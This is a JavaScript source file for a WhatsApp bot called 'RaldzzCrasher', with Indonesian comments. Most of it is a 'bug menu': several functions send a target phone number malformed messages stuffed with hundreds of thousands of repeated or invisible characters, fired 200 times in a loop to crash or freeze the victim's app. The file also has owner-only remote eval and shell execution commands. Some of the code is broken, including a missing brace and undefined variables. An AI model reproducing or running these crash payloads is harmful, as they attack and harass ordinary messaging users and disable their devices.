/*
 Base Script By RaldzzLawxitech
Contact Developer: https://wa.me/6285929014979
MOHON LINK CHANNEL DEVELOPER & NAMA DEVELOPER DI THANKS TO JANGAN DI GANTI YAHH, MOHON KERJA SAMA NYA DAN MOHON UNTUK MENGHARGAI 🙏🏻
*/
require("./config")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')

module.exports = async (Zcon, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');


const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (Zcon.user.id.split(':')[0]+'@s.whatsapp.net' || Zcon.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await Zcon.decodeJid(Zcon.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const orgkaya = JSON.parse(fs.readFileSync('./database/owner.json'))

const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await Zcon.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const viox = fs.readFileSync(`./lib/trash/trash.jpg`)
//====================================\\
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Zcon.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

// respon list 
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Zcon.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Zcon.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
    // function resize
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};
// REPLY BUGS
async function loadbug() {
      var zurloading = [
        "*_Proccesing Send Bug Target 🥵_*",
        "_*Please Wait 🕐*_",
        "_*Please Wait 🕑*_",
        "_*Please Wait 🕒*_",
        "_*Please Wait 🕓*_",
        "_*Please Wait 🕔*_",
        "_*Please Wait 🕕*_",
        "_*DUUAAARRRRRRR*_",
        "_*Bug By RaldzzLawxitech 😼*_",
        "_*Succesfully Send Bug To Target 🗿🚬*_"
      ]
      let { key } = await Zcon.sendMessage(from, { text: '_*Procces Attacking Target*_' })
      for (let i = 0; i < zurloading.length; i++) {
        await Zcon.sendMessage(from, { text: zurloading[i], edit: key });
      }
    }
// FUNCTION REACT//
const successreact = ['✅']
		const finishbug = successreact[Math.floor(Math.random() * successreact.length)]
		const donebug = (teks) => {
			return Zcon.sendMessage(m.chat, {
				react: {
					text: teks,
					key: m.key
				}
			})
		}
//==============================================//
async function freezeBeta1(target) {
    await Zcon.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "♨️ 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 ♨️" + "ꦽ".repeat(450000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ 
                            groupJid: "1@newsletter", 
                            groupSubject: "RALDZZ CRASH" 
                        }]
                    },
                    footer: "ꦾ".repeat(2000)
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
 console.log(chalk.red("Succesfully Send Bug To Target"));
}
//==============================================//
async function freezeBeta2(target) {
    await Zcon.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "☠️ 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 ☠️" + "◌".repeat(450000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ 
                            groupJid: "1@newsletter", 
                            groupSubject: "RALDZZ CRASH" 
                        }]
                    },
                    footer: "ꦾ".repeat(2000)
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
 console.log(chalk.red("Succesfully Send Bug To Target"));
//==============================================//
async function sendxoMessage(target) {
    let messageText = "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣";
    let timestamp = Date.now();

    await Zcon.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: -999.03499999999999,
                            degreesLongitude: 999.03499999999999
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(250000) 
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "RALDZZ CRASH" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } });
  console.log(chalk.red("Succesfully Send Bug To Target"));
}
//==============================================//
async function freezekamoflase(target) {
    await Zcon.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "ꦾ".repeat(450000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ 
                            groupJid: "1@newsletter", 
                            groupSubject: "RALDZZ CRASH" 
                        }]
                    },
                    footer: "ꦾ".repeat(2000)
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
 console.log(chalk.red("Succesfully Send Bug To Target"));
}
//==============================================//
async function blank(target) {
			var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "📜 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 📜" + "ꦾ".repeat(350000),
							"jpegThumbnail": "",
							"caption": "ꦾ".repeat(350000),
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': target
			});
			await Zcon.relayMessage(target, messageContent.message, {
				'participant': {
					'jid': target
				},
				'messageId': messageContent.key.id
			});
		}
//==============================================//
async function bugDocu(target) {
  try {
    const pesan = "@0".repeat(250000);
    const file = {
      name: "ꦾ".repeat(250000) + ".txt",
      size: 1099511627776, // 1TB
      data: "0".repeat(1099511627776),
    };
    const message = {
      text: pesan,
      contextInfo: { mentionedJid: ['6285929014979@s.whatsapp.net'] },
      attachment: file,
    };
    await Zcon.relayMessage(target, message, {
      participant: { jid: target },
      messageId: null,
    });
    console.log("Sukses mengirim pesan");
  } catch (error) {
    console.error("Gagal mengirim pesan:", error);
  }
}
//==============================================//
async function bugBetaDox(target) {
  try {
    const pesan = "ꦽ".repeat(350000);
    const file = {
      name: "ꦾ".repeat(250000) + ".txt",
      size: 1099511627776, // 1TB
      data: "0".repeat(1099511627776),
    };
    const message = {
      text: pesan,
      contextInfo: { mentionedJid: ['6285929014979@s.whatsapp.net'] },
      attachment: file,
    };
    await Zcon.relayMessage(target, message, {
      participant: { jid: target },
      messageId: null,
    });
    console.log("Sukses mengirim pesan");
  } catch (error) {
    console.error("Gagal mengirim pesan:", error);
  }
}
//==============================================//
async function crashBeta(target) {
			var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "📜 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 📜" + "ꦽ".repeat(350000),
							"jpegThumbnail": "",
							"caption": "ꦽ".repeat(350000),
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': target
			});
			await Zcon.relayMessage(target, messageContent.message, {
				'participant': {
					'jid': target
				},
				'messageId': messageContent.key.id
			});
		}
//==============================================//
async function doxIP(target) {
  try {
    const pesan = "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(350000);
    const file = {
      name: "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(250000) + ".txt",
      size: 1099511627776, // 1TB
      data: "0".repeat(1099511627776),
    };
    const message = {
      text: pesan,
      contextInfo: { mentionedJid: ['6285929014979@s.whatsapp.net'] },
      attachment: file,
    };
    await Zcon.relayMessage(target, message, {
      participant: { jid: target },
      messageId: null,
    });
    console.log("Sukses mengirim pesan");
  } catch (error) {
    console.error("Gagal mengirim pesan:", error);
  }
}
//==============================================//
async function lockIP(target) {
    await Zcon.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(450000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ 
                            groupJid: "1@newsletter", 
                            groupSubject: "RALDZZ CRASH" 
                        }]
                    },
                    footer: "ꦾ".repeat(2000)
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
 console.log(chalk.red("Succesfully Send Bug To Target"));
}
//==============================================//
// BATA FUNCTION //
    
const bangke = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "99999",
      thumbnail: viox,
      itemCount: 404,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `${m.body || m.mtype}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 9999,
    isForwarded: true
  }
};
    
async function downloadMp3 (link) {
try {
Zcon.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
Zcon.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
Zcon.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
Zcon.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

//self public
global.public = true
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}

const reply = (teks) => { 
Zcon.sendMessage(from, { text: teks, contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: false,
title: `Simple Botz WhatsApp`,
body: `𝘾𝙧𝙚𝙖𝙩𝙚𝙙 𝘽𝙮 𝙍𝙖𝙡𝙙𝙯𝙯`,
previewType: "VIDEO",
thumbnail: viox,
sourceUrl: `${global.zura}`,
mediaUrl: `${global.zura}`
}
},
text: teks
}, {
quoted: m
})
}

const reply2 = (teks) => {
Zcon.sendMessage(from, { text : teks }, { quoted : m })
}


function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
		// +minutes+":"+sec;
  }

// Sayying time
const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Selamat Malam 🌃'
}
if(timee < "19:00:00"){
var waktuucapan = 'Selamat Petang 🌆'
}
if(timee < "18:00:00"){
var waktuucapan = 'Selamat Sore 🌅'
}
if(timee < "15:00:00"){
var waktuucapan = 'Selamat Siang 🏙'
}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi 🌄'
}
if(timee < "05:00:00"){
var waktuucapan = 'Selamat Subuh 🌉'
}
if(timee < "03:00:00"){
var waktuucapan = 'Tengah Malam 🌌'
}


if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Maaf, command yang kamu berikan salah. mungkin ini yang kamu maksud:\n\n•> ${prefix+mean}\n•> Kemiripan: ${similarityPercentage}%`
reply(response)
}}

switch(command) {


case 'menu':
let menu = {
        image: viox,
        caption: `*❗ ⿻ INFORMATION BOT ⿻ ❗*
> *Developer* : RaldzzLawxitech
> *Bot Name* : RaldzzCrasher
> *Version* : 1.0
> *Runtime* : ${runtime(process.uptime())} ⌛

*❗ ⿻ BUG MENU ⿻ ❗*
> .crash _>input number target<_
> .raldzzcrash _>input number target<_
> .uicrash _>input number target<_
> .blankui _>input number target<_
> .travaios _>input number target<_
> .ioscrash _>input number target<_
> .betacrash _>input number target<_

*❗ ⿻ SETTING MENU ⿻ ❗*
> .addacces _>number/@tag<_
> .delacces _>number/@tag<_
> .self
> .public

*❗ ⿻ THANKS TO ⿻ ❗*
> RaldzzLawxitech [Developer] 👑
> GOD IS GOOD 👑   

*CREDIT DEVELOPER :* https://whatsapp.com/channel/0029VanySqUBPzjYa2929d0U
`}
Zcon.sendMessage(from, menu)
break

case 'crash': case 'raldzzcrash': case 'ioscrash': case 'uicrash': case 'blankui': case 'travaios': case 'betacrash': {
if (!isCreator && !isPremium) return reply(`<❗> You Not Have Acces For Use This Feature`)
if (!text) return reply(`Example: .${command} +628XXXXX`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return reply(`\`[ # ]\` Input Number Target With Prefix Country Code\n\n\`[ # ]\` Example : .${command} +628XXXXX`)
let Pe = peler + '@s.whatsapp.net'
await loadbug()
for (let i = 0; i < 200; i++) {
await sendxoMessage(Pe)
await blank(Pe)
await freezekamoflase(Pe)
await doxIP(Pe)
await lockIP(PE)
await freezeBeta1(Pe)
await freezeBeta2(Pe)
}
await bugDocu(Pe)
await bugBetaDox(Pe)
await crashBeta(Pe)
await donebug(finishbug)
}
break

case "addacces":
if (!isCreator) return reply('*Only Owner !!!*')
if (!text) return reply(`Using ${prefix+command} Number\nExample ${prefix+command} 628xxx`)
var prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
kontributor.push(prem1)
fs.writeFileSync('./database/premium.json', JSON.stringify(kontributor))
reply(`Success Add Acces Premium ✅`)
await sleep(3500)
break

case 'delacces':
if (!isCreator) return reply('*Only Owner !!!*')
if (!text) return reply(`Using ${prefix+command} Number\nExample ${prefix+command} 628xxx`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = kontributor.indexOf(prem2)
kontributor.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(kontributor))
reply(`Succes Delete Acces Premium ✅`)
break

case 'self': {
if (!isCreator) return reply(mess.OnlyOwner)
global.public = false
reply('Sukses Change To Self Mode ✅')
}
break

case 'public': {
if (!isCreator) return reply(mess.OnlyOwner)
global.public = true
reply('Sukses Change To Public Mode ✅')
}
break


default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
